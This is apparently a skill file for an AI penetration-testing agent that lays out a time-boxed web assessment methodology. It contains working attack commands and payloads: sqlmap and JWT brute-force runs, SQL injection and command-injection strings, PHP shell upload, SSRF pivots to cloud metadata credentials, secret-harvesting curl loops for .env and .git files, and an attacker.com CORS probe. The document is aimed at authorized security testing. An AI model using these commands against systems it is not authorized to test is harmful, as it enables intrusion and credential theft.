---
name: quick
description: Time-boxed rapid assessment targeting high-impact vulnerabilities only — with mandatory UI exploration, real impact validation, strict anti-false-positive enforcement, and CORS restricted to sensitive endpoints only
---

# Quick Testing Mode — Fast, Focused, High-Impact Only

Time-boxed rapid assessment for maximum ROI. Skip exhaustive enumeration. Focus on the highest-impact vulnerability classes first. Every finding must still be proven with real exploitation — speed does not justify false positives.

Quick mode is NOT shallow mode. The prioritization is different. The standards for reporting are identical.

---

## Core Quick Mode Rules

**Rule 1**: UI exploration is still mandatory — even in quick mode. Navigate the application as a real user before any automated testing.

**Rule 2**: Every finding must still pass the Real Impact Gate. Quick mode does not lower the evidence bar — it lowers the scope.

**Rule 3**: CORS is NEVER tested on public/unauthenticated endpoints in quick mode. CORS is only worth testing on sensitive authenticated API endpoints — anything else is a guaranteed false positive.

**Rule 4**: Self-XSS, missing security headers alone, username enumeration without brute-force risk, and rate limiting absence on non-sensitive endpoints are NOT reported in quick mode.

**Rule 5**: Stop depth, not breadth. If you find a critical vulnerability, document it fully and move to the next priority. Don't rabbit-hole. Keep moving.

---

## Phase 0: Rapid Orientation (15 Minutes)

### For White-Box (source available):
- Focus on recent changes: `git log --oneline -50`, `git diff HEAD~10 -- "*.py" "*.js" "*.php"`
- Recent commits to auth, payments, or access control → highest priority review
- Search for dangerous patterns:
  ```bash
  grep -rn "eval\|exec\|system\|shell_exec\|popen\|subprocess\|os\.system" src/
  grep -rn "innerHTML\|document\.write\|dangerouslySetInnerHTML\|v-html" src/
  grep -rn "raw_query\|execute\|whereRaw\|orderByRaw" src/
  grep -rn "render_template_string\|jinja2\.Template\|Environment" src/
  ```
- Check dependencies: `trivy fs .` for known CVEs

### For Black-Box (no source):
- Fetch robots.txt, /swagger.json, /openapi.json, /api/docs — any API spec immediately available
- Run quick tech fingerprint: `httpx -u https://target.com -title -tech-detect`
- Quick endpoint discovery: `ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -mc 200,301,302 -t 50`
- Extract endpoints from main JS bundle
- Navigate the application in browser for 5 minutes — click the main navigation to understand the feature set

---

## Phase 1: Rapid UI Walkthrough

Even in quick mode, spend 10-15 minutes doing a manual browser walkthrough:
1. Navigate to the home page
2. Click the main navigation items (Dashboard, Profile, Messages, Settings, etc.)
3. Identify the most sensitive features: messaging, payments, profile editing, file upload, admin panel
4. Log in as a user and identify the authenticated features
5. Note all URL patterns and parameters for the highest-value endpoints

This walkthrough tells you where to focus automated testing.

---

## Phase 2: High-Impact Priority Testing

Test in this EXACT priority order. Each item must be fully validated before moving to the next.

### Priority 1: Broken Access Control (IDOR + Privilege Escalation)

The single highest ROI test in most applications.

**Setup**: Create two user accounts (User A and User B) via the UI.

**Rapid IDOR scan**:
```python
# For every integer ID seen in any API request with User A's session,
# try accessing it with User B's session
def quick_idor_scan(endpoints_with_ids, user_b_cookie):
    for url in endpoints_with_ids:
        r = requests.get(url, cookies={"session": user_b_cookie})
        if r.status_code == 200:
            body = r.text
            # Check if response has non-trivial content (not just empty {})
            if len(body) > 50 and user_a_private_data in body:
                print(f"IDOR CONFIRMED: {url}")
                print(f"Leaked: {body[:200]}")
```

**Vertical escalation**: Try User A's token on any admin endpoint discovered:
- /admin/*, /api/admin/*, /manage/*, /internal/*
- Try adding `"role":"admin"` to any update request

### Priority 2: Authentication Bypass

```bash
# SQL injection in login (manual + sqlmap)
sqlmap -u "https://target.com/login" --data="email=test@t.com&password=test" \
  --method=POST --batch --technique=B --level=2 --risk=1

# JWT manipulation
jwt_tool [TOKEN] -X a  # none algorithm
jwt_tool [TOKEN] -C -d /usr/share/wordlists/rockyou.txt  # weak secret brute force
```

Manual tests:
- Submit `' OR '1'='1'--` as username
- Try default credentials: admin/admin, admin/password, admin@target.com/admin
- Test multi-step auth bypass: access step 3 URL directly after only completing step 1

### Priority 3: Remote Code Execution

If ANY of these features exist → test them first:
- File upload (especially images, documents) → try uploading PHP/JSP shell
- Template rendering endpoints → test SSTI: `{{7*7}}`, `${7*7}`, `#{7*7}`
- URL/path parameters that might reach the filesystem → test LFI/RFI
- Command/system integrations → test `; id`, ` | id`, `$(id)`, `` `id` ``

### Priority 4: SQL Injection

```bash
# Spray all captured API requests
sqlmap -l /workspace/quick_proxy_capture.txt --batch --level=3 \
  --technique=BEUST --dbms=mysql,postgresql,mssql \
  --output-dir=/workspace/sqlmap_quick/
```

Focus on: search parameters, filter parameters, order parameters, any integer ID in URL path.

### Priority 5: SSRF

Test any URL-accepting parameters immediately:
```bash
# Quick SSRF test
OAST_URL="http://$(interactsh-client -id).oast.fun"
for param in url link src webhook avatar import fetch preview; do
  curl -s -X POST "https://target.com/api/import" \
    -d "${param}=${OAST_URL}/ssrf-test-${param}" \
    -H "Cookie: ${USER_COOKIE}" &
done
wait
# Check interactsh-client for incoming connections
```

If any SSRF callback received → immediately escalate to metadata endpoints:
```bash
curl -s "https://target.com/api/import" \
  -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -H "Cookie: ${USER_COOKIE}"
```

### Priority 6: Exposed Secrets & Keys

```bash
# Check JS bundles and publicly accessible files
trufflehog --regex --entropy=False https://target.com
# Check source maps if available
curl -s https://target.com/static/app.js.map | python3 -m json.tool | grep -i "key\|secret\|token\|password"
# Check .env, config files
for path in .env .env.local config.json settings.json appsettings.json; do
  curl -si "https://target.com/${path}" | head -20
done
# Check git exposure
curl -si "https://target.com/.git/config"
curl -si "https://target.com/.git/HEAD"
```

---

## Phase 3: Targeted XSS Testing

Focus ONLY on stored XSS (higher impact than reflected in quick mode):
- Profile name, bio, username → any field that displays to other users
- Message/comment content
- File upload filename if displayed

For reflected XSS: test ONLY endpoints where the reflected parameter lands in a JavaScript or event handler context (higher impact than simple HTML context).

Confirm ALL XSS findings with browser execution — never report XSS that only reflects in source.

---

## Phase 4: Quick CORS Validation (SENSITIVE ENDPOINTS ONLY)

**STOP. Before testing CORS, ask: "Does this endpoint return sensitive data?"**

Quick filter for which endpoints are worth CORS testing:
```python
# Only test endpoints that return PII/tokens/sensitive data
for endpoint in discovered_endpoints:
    r = requests.get(endpoint, headers={"Cookie": user_a_cookie})
    if any(k in r.text.lower() for k in ["password", "token", "secret", "email", "phone", "credit", "ssn", "dob"]):
        # Now test CORS on this endpoint
        r2 = requests.get(endpoint,
            headers={"Origin": "https://attacker.com", "Cookie": user_a_cookie})
        acao = r2.headers.get("Access-Control-Allow-Origin", "")
        acac = r2.headers.get("Access-Control-Allow-Credentials", "")
        if acao == "https://attacker.com" and acac == "true":
            print(f"EXPLOITABLE CORS: {endpoint}")
```

NEVER report CORS on: login page, public API endpoints, static file servers, endpoints returning only success/failure boolean.

---

## Phase 5: Business Logic Quick Tests

Focus on the highest-value flows:
- Payment/checkout: try negative prices, zero prices, price manipulation after cart confirmation
- Subscription: try accessing premium features before payment completes
- Coupon/discount: try applying the same coupon twice simultaneously (race condition)
- Quota: try exceeding limits by sending simultaneous requests
- Email/phone change: does it require current password? Can it be done cross-site (CSRF)?

---

## Quick Validation Protocol

Even in quick mode, the validation bar is the same:

Before reporting ANY finding:
1. **Can I reproduce it 3 times in a row?** If no: investigate more
2. **Does it have real impact?** "200 OK" is NOT impact — what data was leaked or what action was completed?
3. **Have I confirmed with 2 independent signals?** List them both
4. **Is it a known false positive type?** (CORS on public endpoint, self-XSS, missing headers only) If yes: discard or downgrade

Quick-mode specific false positive check:
- IDOR returning 200 but response body is empty or contains only public data → NOT an IDOR, discard
- XSS reflected in HTML source but HTML-encoded → NOT XSS, discard
- SSRF DNS callback received but no internal resource accessed → Informational only (not High/Critical)
- CORS on non-sensitive endpoint → Discard entirely

---

## Quick Reporting Format

Even in quick mode, every report needs all 11 sections. The difference from deep mode is scope, not quality.

Minimum for each section in quick mode:
- UI steps: still fully numbered, still every click documented
- Screenshots: still required (before/after/proof)
- PoC: still self-contained and executable
- Impact: still specific and business-level — not generic text

---

## What to Skip in Quick Mode

The following are NOT tested in quick mode (save for Standard/Deep scans):
- Exhaustive subdomain enumeration
- Full port scanning (only top 1000 ports)
- Deep directory brute-forcing (use small wordlists only)
- Comprehensive parameter discovery (focus on obvious parameters)
- Advanced HTTP request smuggling
- DOM clobbering and mutation XSS
- Cache poisoning
- Prototype pollution
- Detailed WebSocket security testing
- GraphQL depth/batching attacks
- Comprehensive rate limiting testing on non-auth endpoints
- Low-severity information disclosure without exploitation potential

---

## Quick Mode Mindset

Think like a bug bounty hunter with a 2-hour time limit. Where is the money? What are the highest-severity findings? Go straight for the critical attack surfaces. Don't get distracted by low-severity issues. Find the one Critical or High that matters and prove it completely.

If the first 30 minutes find no quick wins on Priorities 1-3: pivot to less-obvious attack surfaces. Don't keep hammering the same blocked endpoints.

Speed comes from smart targeting, not from lowering standards. Every finding must still be proven. Every report must still be complete. The difference is where you look, not how you validate what you find.
